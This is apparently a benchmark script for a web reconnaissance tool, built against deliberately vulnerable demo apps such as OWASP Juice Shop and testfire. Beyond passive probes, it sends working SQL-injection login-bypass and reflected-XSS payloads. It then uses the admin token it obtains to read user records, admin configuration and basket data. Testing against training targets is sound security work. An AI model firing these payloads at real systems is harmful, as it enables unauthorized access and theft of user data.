#!/usr/bin/env node
import { mkdir, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { join } from 'node:path';

const target = process.argv[2] || process.env.RECON_TARGET_URL;
const profileArg = String(process.env.RECON_PROFILE || process.argv[3] || 'auto').toLowerCase();
const timeoutMs = Number(process.env.RECON_TIMEOUT_MS || 15000);
const maxBodyBytes = Number(process.env.RECON_MAX_BODY_BYTES || 300000);
const sampleBytes = Number(process.env.RECON_SAMPLE_BYTES || 20000);
const userAgent = process.env.RECON_USER_AGENT || 'Mozilla/5.0 Pi-RECON-public-webapp-benchmark';

if (!target || target === '--help' || target === '-h') {
  console.log(`Pi-RECON public webapp live benchmark\n\nUsage:\n  node bench/recon-remote/public-webapp/run.mjs <url> [auto|juice-shop|juice-shop-hard|testfire|generic]\n\nExamples:\n  node bench/recon-remote/public-webapp/run.mjs https://preview.owasp-juice.shop juice-shop\n  node bench/recon-remote/public-webapp/run.mjs https://preview.owasp-juice.shop juice-shop-hard\n  node bench/recon-remote/public-webapp/run.mjs https://demo.testfire.net testfire\n\nEnvironment:\n  RECON_TIMEOUT_MS=15000\n  RECON_MAX_BODY_BYTES=300000\n  RECON_SAMPLE_BYTES=20000\n  RECON_USER_AGENT=<ua>\n\nOutput:\n  .pi/evidence/remote/public-webapp/<host>/<timestamp>/\n`);
  process.exit(target ? 0 : 2);
}

function timestamp() {
  return new Date().toISOString().replace(/[:.]/g, '-');
}

function sha256(data) {
  return createHash('sha256').update(data).digest('hex');
}

function slug(value) {
  return String(value || 'target').replace(/[^a-zA-Z0-9_.-]+/g, '_').slice(0, 100) || 'target';
}

function assertHttpUrl(value) {
  const url = new URL(value);
  if (!['http:', 'https:'].includes(url.protocol)) throw new Error(`Unsupported URL protocol: ${url.protocol}`);
  url.hash = '';
  return url;
}

function resolveProfile(url) {
  if (profileArg !== 'auto') return profileArg;
  const host = url.hostname.toLowerCase();
  if (host.includes('juice')) return 'juice-shop';
  if (host.includes('testfire')) return 'testfire';
  return 'generic';
}

function redactBody(text) {
  return String(text || '')
    .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, '<redacted.jwt>')
    .replace(/(\"token\"\s*:\s*\")([^\"]+)(\")/gi, '$1<redacted>$3')
    .replace(/(msToken=)[^&\"'\s]+/gi, '$1<redacted>')
    .replace(/(a_bogus=)[^&\"'\s]+/gi, '$1<redacted>');
}

function requestHeaders(extra = {}) {
  return {
    'user-agent': userAgent,
    accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8,*/*;q=0.7',
    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
    ...extra,
  };
}

function headerObject(headers) {
  const out = Object.fromEntries(headers.entries());
  for (const key of Object.keys(out)) {
    if (/cookie|authorization|token|session|csrf|xsrf/i.test(key)) out[key] = '<redacted>';
  }
  return out;
}

async function request(baseUrl, probe) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const url = new URL(probe.path || '/', baseUrl).toString();
  const started = Date.now();
  try {
    const res = await fetch(url, {
      method: probe.method || 'GET',
      redirect: probe.redirect || 'manual',
      headers: requestHeaders(probe.headers || {}),
      body: probe.body,
      signal: controller.signal,
    });
    const buf = Buffer.from(await res.arrayBuffer());
    const body = buf.subarray(0, maxBodyBytes).toString('utf8');
    return {
      label: probe.label,
      method: probe.method || 'GET',
      url,
      status: res.status,
      headers: headerObject(res.headers),
      elapsedMs: Date.now() - started,
      bytes: buf.length,
      bodySha256: sha256(buf).slice(0, 24),
      rawBody: body,
      bodyHead: redactBody(body.slice(0, sampleBytes)),
      error: null,
    };
  } catch (error) {
    return {
      label: probe.label,
      method: probe.method || 'GET',
      url,
      status: 'error',
      elapsedMs: Date.now() - started,
      error: error instanceof Error ? error.message : String(error),
    };
  } finally {
    clearTimeout(timer);
  }
}

function extractLinks(html, baseUrl) {
  const out = [];
  for (const match of String(html || '').matchAll(/(?:href|src|action)=["']([^"'<>]+)["']/gi)) {
    try {
      const url = new URL(match[1], baseUrl);
      if (['http:', 'https:'].includes(url.protocol)) out.push(url.toString());
    } catch {}
  }
  return [...new Set(out)].slice(0, 120);
}

function securityHeaderFindings(response) {
  const headers = response?.headers || {};
  const expected = {
    'content-security-policy': 'missing_csp',
    'x-frame-options': 'missing_x_frame_options',
    'x-content-type-options': 'missing_x_content_type_options',
    'strict-transport-security': 'missing_hsts',
  };
  return Object.entries(expected)
    .filter(([key]) => !headers[key])
    .map(([, name]) => name);
}

function buildProbes(profile) {
  if (profile === 'juice-shop' || profile === 'juice-shop-hard') {
    return [
      { label: 'home', path: '/' },
      { label: 'version-api', path: '/rest/admin/application-version', headers: { accept: 'application/json,*/*' } },
      { label: 'products-api', path: '/rest/products/search?q=', headers: { accept: 'application/json,*/*' } },
      { label: 'challenge-api', path: '/api/Challenges', headers: { accept: 'application/json,*/*' } },
      { label: 'ftp-index', path: '/ftp/' },
      { label: 'ftp-confidential-acquisitions', path: '/ftp/acquisitions.md', headers: { accept: 'text/markdown,text/plain,*/*' } },
      ...(profile === 'juice-shop-hard' ? [{
        label: 'juice-sqli-login-bypass',
        path: '/rest/user/login',
        method: 'POST',
        headers: { 'content-type': 'application/json', accept: 'application/json,*/*' },
        body: JSON.stringify({ email: "' or 1=1--", password: 'x' }),
      }] : []),
    ];
  }
  if (profile === 'testfire') {
    const xssPayload = '<script>alert(1)</script>';
    return [
      { label: 'home', path: '/' },
      { label: 'login-page', path: '/login.jsp' },
      { label: 'protected-main-baseline', path: '/bank/main.jsp' },
      { label: 'search-baseline', path: '/search.jsp?query=test' },
      { label: 'reflected-xss-probe', path: `/search.jsp?query=${encodeURIComponent(xssPayload)}` },
      {
        label: 'sqli-login-bypass-probe',
        path: '/doLogin',
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ uid: "admin' OR '1'='1", passw: 'x', btnSubmit: 'Login' }).toString(),
      },
    ];
  }
  return [
    { label: 'home', path: '/' },
    { label: 'robots', path: '/robots.txt' },
    { label: 'sitemap', path: '/sitemap.xml' },
    { label: 'security-txt', path: '/.well-known/security.txt' },
  ];
}

function decodeJwtPayload(token) {
  try {
    const payload = String(token || '').split('.')[1];
    if (!payload) return null;
    return JSON.parse(Buffer.from(payload.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
  } catch {
    return null;
  }
}

function parseJsonBody(probe) {
  try {
    return JSON.parse(probe?.rawBody || probe?.bodyHead || '{}');
  } catch {
    return null;
  }
}

async function runDependentProbes(profile, baseUrl, probes) {
  if (profile !== 'juice-shop-hard') return [];
  const login = probes.find((probe) => probe.label === 'juice-sqli-login-bypass');
  const parsed = parseJsonBody(login);
  const auth = parsed?.authentication || {};
  const token = auth.token;
  if (!token) return [];
  const authHeaders = { authorization: `Bearer ${token}`, accept: 'application/json,*/*' };
  const dependent = [
    { label: 'auth-api-users', path: '/api/Users', headers: authHeaders },
    { label: 'auth-admin-config', path: '/rest/admin/application-configuration', headers: authHeaders },
    { label: 'auth-basket', path: `/rest/basket/${auth.bid || 1}`, headers: authHeaders },
    { label: 'auth-basket-items', path: '/api/BasketItems', headers: authHeaders },
  ];
  const out = [];
  for (const probe of dependent) out.push(await request(baseUrl, probe));
  return out;
}

function analyze(profile, baseUrl, probes) {
  const byLabel = Object.fromEntries(probes.map((p) => [p.label, p]));
  const findings = [];
  const home = byLabel.home;
  if (home) {
    for (const missing of securityHeaderFindings(home)) findings.push({ id: missing, severity: 'info', evidence: 'home response header absent' });
  }
  if (profile === 'juice-shop' || profile === 'juice-shop-hard') {
    const products = byLabel['products-api'];
    const challenges = byLabel['challenge-api'];
    const ftpConf = byLabel['ftp-confidential-acquisitions'];
    const version = byLabel['version-api'];
    if (version?.status === 200 && /version/i.test(version.bodyHead || '')) findings.push({ id: 'version_api_exposed', severity: 'info', evidence: '/rest/admin/application-version returned JSON' });
    if (products?.status === 200 && /"status"\s*:\s*"success"/.test(products.bodyHead || '')) findings.push({ id: 'product_search_api_reachable', severity: 'info', evidence: '/rest/products/search?q= returned success JSON' });
    if (challenges?.status === 200 && /"category"|"description"|"key"/.test(challenges.bodyHead || '')) findings.push({ id: 'challenge_inventory_reachable', severity: 'low', evidence: '/api/Challenges returned challenge metadata' });
    if (ftpConf?.status === 200 && /confidential|acquisitions/i.test(ftpConf.bodyHead || '')) findings.push({ id: 'confidential_ftp_document_exposed', severity: 'medium', evidence: '/ftp/acquisitions.md returned confidential acquisition text' });
    if (profile === 'juice-shop-hard') {
      const login = byLabel['juice-sqli-login-bypass'];
      const parsed = parseJsonBody(login);
      const auth = parsed?.authentication || {};
      const jwt = decodeJwtPayload(auth.token);
      if (login?.status === 200 && auth.token && jwt?.data?.role === 'admin') findings.push({ id: 'juice_sqli_login_bypass_admin_jwt', severity: 'critical', evidence: "POST /rest/user/login with email=' or 1=1-- returned JWT with role=admin" });
      const users = byLabel['auth-api-users'];
      const config = byLabel['auth-admin-config'];
      const basket = byLabel['auth-basket'];
      const items = byLabel['auth-basket-items'];
      if (users?.status === 200 && /\"email\"|\"role\"|\"data\"/.test(users.rawBody || users.bodyHead || '')) findings.push({ id: 'admin_users_api_reachable_with_bypass_token', severity: 'high', evidence: '/api/Users returned user records using bypass JWT' });
      if (config?.status === 200 && /application|server|config/i.test(config.rawBody || config.bodyHead || '')) findings.push({ id: 'admin_config_api_reachable_with_bypass_token', severity: 'high', evidence: '/rest/admin/application-configuration returned config using bypass JWT' });
      if (basket?.status === 200 && /Basket|Products|UserId/i.test(basket.rawBody || basket.bodyHead || '')) findings.push({ id: 'authenticated_basket_read_confirmed', severity: 'medium', evidence: '/rest/basket/<bid> returned authenticated basket data' });
      if (items?.status === 200 && /ProductId|BasketId|quantity/i.test(items.rawBody || items.bodyHead || '')) findings.push({ id: 'basket_items_api_reachable_with_bypass_token', severity: 'medium', evidence: '/api/BasketItems returned basket item data using bypass JWT' });
    }
  }
  if (profile === 'testfire') {
    const xss = byLabel['reflected-xss-probe'];
    const sqli = byLabel['sqli-login-bypass-probe'];
    const protectedMain = byLabel['protected-main-baseline'];
    if (protectedMain?.status === 302 && /\/login\.jsp|login/i.test(protectedMain.headers?.location || '')) findings.push({ id: 'protected_main_redirects_pre_auth', severity: 'info', evidence: '/bank/main.jsp redirects before login' });
    if (xss?.status === 200 && (xss.bodyHead || '').includes('<script>alert(1)</script>')) findings.push({ id: 'reflected_xss_confirmed', severity: 'high', evidence: 'search.jsp reflects script tag unencoded in HTML body' });
    if (sqli?.status === 302 && /\/bank\/main\.jsp/i.test(sqli.headers?.location || '')) findings.push({ id: 'sqli_login_bypass_confirmed', severity: 'critical', evidence: "POST /doLogin with admin' OR '1'='1 redirected to /bank/main.jsp" });
  }
  const links = [...new Set(probes.flatMap((probe) => extractLinks(probe.bodyHead || '', baseUrl)))];
  const routeHints = links.map((link) => {
    const url = new URL(link);
    return `${url.origin}${url.pathname}`;
  });
  const high = findings.filter((f) => ['high', 'critical'].includes(f.severity)).length;
  const medium = findings.filter((f) => f.severity === 'medium').length;
  const reachable = probes.filter((p) => Number(p.status) >= 200 && Number(p.status) < 400).length;
  const verdict = high ? 'exploitable-confirmed' : medium ? 'sensitive-exposure-confirmed' : reachable ? 'surface-mapped' : 'no-live-surface';
  return { verdict, findings, links: links.slice(0, 80), routeHints: [...new Set(routeHints)].slice(0, 80) };
}

const baseUrl = assertHttpUrl(target);
const profile = resolveProfile(baseUrl);
const outDir = join('.pi', 'evidence', 'remote', 'public-webapp', slug(baseUrl.hostname), timestamp());
await mkdir(outDir, { recursive: true });

const started = Date.now();
const probeDefs = buildProbes(profile);
const probes = [];
for (const probe of probeDefs) probes.push(await request(baseUrl, probe));
probes.push(...await runDependentProbes(profile, baseUrl, probes));
const analysis = analyze(profile, baseUrl.toString(), probes);

const result = {
  target: baseUrl.toString(),
  profile,
  verdict: analysis.verdict,
  elapsedMs: Date.now() - started,
  findings: analysis.findings,
  probes: probes.map(({ rawBody, ...probe }) => ({
    ...probe,
    bodyHead: probe.bodyHead ? redactBody(probe.bodyHead).slice(0, 3000) : probe.bodyHead,
  })),
  routeHints: analysis.routeHints,
  links: analysis.links,
  nextActions: analysis.verdict === 'exploitable-confirmed'
    ? ['bind confirmed request/response pair into verifier matrix', 'add replay-safe regression for the confirmed vector', 'extend auth/session state capture']
    : ['rerun with a profile-specific probe pack', 'capture browser/CDP if client-side routes dominate', 'add authenticated principals when credentials are available'],
};

await writeFile(join(outDir, 'result.json'), `${JSON.stringify(result, null, 2)}\n`);
for (const probe of probes) {
  await writeFile(join(outDir, `${slug(probe.label)}.head.txt`), String(probe.bodyHead || ''));
}

const md = [
  '# Pi-RECON Public Webapp Benchmark Artifact',
  '',
  `target: ${baseUrl.toString()}`,
  `profile: ${profile}`,
  `verdict: ${analysis.verdict}`,
  `artifact_dir: ${outDir}`,
  '',
  '## Findings',
  ...(analysis.findings.length ? analysis.findings.map((f) => `- severity=${f.severity} id=${f.id} evidence=${f.evidence}`) : ['- none']),
  '',
  '## Probe Matrix',
  ...probes.map((p) => `- ${p.label}: method=${p.method} status=${p.status} bytes=${p.bytes ?? 0} type=${p.headers?.['content-type'] || ''} location=${p.headers?.location || ''} url=${p.url}`),
  '',
  '## Route Hints',
  ...(analysis.routeHints.slice(0, 25).map((x) => `- ${x}`)),
  '',
  '## Verification',
  `- JSON: ${join(outDir, 'result.json')}`,
  '- Response body heads are stored as *.head.txt files.',
  '',
  '## Next Step',
  ...result.nextActions.map((x) => `- ${x}`),
  '',
].join('\n');
await writeFile(join(outDir, 'artifact.md'), md);

console.log(JSON.stringify({
  target: baseUrl.toString(),
  profile,
  verdict: analysis.verdict,
  findings: analysis.findings.map((f) => f.id),
  artifactDir: outDir,
}, null, 2));
